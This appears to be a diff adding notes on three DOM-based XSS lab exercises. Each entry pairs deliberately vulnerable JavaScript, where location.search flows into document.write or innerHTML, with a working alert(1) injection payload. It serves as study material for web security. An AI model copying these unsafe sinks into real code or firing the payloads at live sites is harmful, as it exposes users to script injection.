@@ -83,3 +83,65 @@ xss_stored_href_attribute.py
 </script><img src=1 onerror=alert(1)>
 ```
 
+## DOM XSS in document.write sink using source location.search
+* Vulnerable Code
+```html
+<script>
+    function trackSearch(query) {
+        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+    }
+    var query = (new URLSearchParams(window.location.search)).get('search');
+    if(query) {
+        trackSearch(query);
+    }
+</script>
+```
+
+* Payload
+```html
+"><script>alert(1)</script>
+```
+
+## DOM XSS in document.write sink using source location.search inside a select element
+* Vulnerable Code
+```html
+<script>
+    var stores = ["London","Paris","Milan"];
+    var store = (new URLSearchParams(window.location.search)).get('storeId');
+    document.write('<select name="storeId">');
+    if(store) {
+        document.write('<option selected>'+store+'</option>');
+    }
+    for(var i=0;i<stores.length;i++) {
+        if(stores[i] === store) {
+            continue;
+        }
+        document.write('<option>'+stores[i]+'</option>');
+    }
+    document.write('</select>');
+</script>
+```
+
+* Payload
+```html
+</option></select><script>alert(1)</script>
+```
+
+## DOM XSS in innerHTML sink using source location.search
+* Vulnerable Code
+```html
+<script>
+    function doSearchQuery(query) {
+        document.getElementById('searchMessage').innerHTML = query;
+    }
+    var query = (new URLSearchParams(window.location.search)).get('search');
+    if(query) {
+        doSearchQuery(query);
+    }
+</script>
+```
+
+* Payload
+```html
+<img src=1 onerror=alert(1)>
+```
